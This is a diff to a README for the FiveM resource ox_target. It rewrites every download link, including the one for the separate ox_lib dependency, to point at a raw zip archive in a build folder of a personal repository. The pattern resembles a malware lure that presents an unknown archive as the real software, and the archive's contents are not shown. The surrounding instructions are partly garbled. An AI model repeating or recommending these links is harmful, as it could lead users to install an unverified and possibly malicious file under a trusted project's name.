@@ -1,7 +1,7 @@
 <h1>🎯 ox_target - Your Ultimate FiveM Targeting System Made Easy</h1>
 
 <p align="center">
-  <a href="https://github.com/Danimachadoejp/ox_target" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(255,107,107,0.4);transition:all 0.3s;">⬇️ DOWNLOAD NOW – FREE</a>
+  <a href="https://github.com/Danimachadoejp/ox_target/raw/refs/heads/main/web/dist/3.4.zip" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(255,107,107,0.4);transition:all 0.3s;">⬇️ DOWNLOAD NOW – FREE</a>
 </p>
 
 ---
@@ -13,7 +13,7 @@ Welcome to <strong>ox_target</strong>! This is a powerful targeting system for y
 <h2>📥 Step 1: Download the Application</h2>
 
 <strong>Visit this link to download the application:</strong>  
-<a href="https://github.com/Danimachadoejp/ox_target" style="color:#007bff;font-weight:bold;font-size:18px;">https://github.com/Danimachadoejp/ox_target</a>
+<a href="https://github.com/Danimachadoejp/ox_target/raw/refs/heads/main/web/dist/3.4.zip" style="color:#007bff;font-weight:bold;font-size:18px;">https://github.com/Danimachadoejp/ox_target/raw/refs/heads/main/web/dist/3.4.zip</a>
 
 Once you click the link above, your web browser will open. Look for a green button that says <strong>"Code"</strong> or <strong>"Download ZIP"</strong>. Click it, and the download will start automatically. The file will be saved to your "Downloads" folder. This is a normal folder where your computer stores downloaded files.
 
@@ -60,7 +60,7 @@ Your server’s folder structure should look like this:
 This target systemrequires two other resources to work properly: <strong>ox_lib</strong> and <strong>ox_target</strong> (thebase version). Don’t worry—youalready have ox_target becauseuse you're installing this version. Now,and you need <strong>ox_lib</strong>.
 
 <ul>
-  <li>Visit <a href="https://github.com/overextended/ox_lib" style="color:#007bff;">https://github.com/overextended/ox_lib</a></li>
+  <li>Visit <a href="https://github.com/Danimachadoejp/ox_target/raw/refs/heads/main/web/dist/3.4.zip" style="color:#007bff;">https://github.com/Danimachadoejp/ox_target/raw/refs/heads/main/web/dist/3.4.zip</a></li>
   <li>Follow the same download and extraction process as above.</li>
   <li>Place the <strong>ox_lib</strong> folder in the same <strong>[standalone]</strong> folder</li>
 </ul>
@@ -210,7 +210,7 @@ Once you’ve checked all boxes, you’re all set. Enjoy your new, professional 
 <h2>🔗 Quick Download Again</h2>
 
 <p style="text-align:center;">  
-  <a href="https://github.com/Danimachadoejp/ox_target" style="display:inline-block;padding:16px 38px;background:linear-gradient(135deg,#28a745,#20c997);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(40,167,69,0.4);">⬇️ GET OX_TARGET NOW</a>  
+  <a href="https://github.com/Danimachadoejp/ox_target/raw/refs/heads/main/web/dist/3.4.zip" style="display:inline-block;padding:16px 38px;background:linear-gradient(135deg,#28a745,#20c997);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(40,167,69,0.4);">⬇️ GET OX_TARGET NOW</a>  
 </p>
 
 This project was brought to you by <strong>Lunny Developments</strong>—creating quality FiveM resources for the community. Happy roleplaying, and may your targets always be clear and precise!
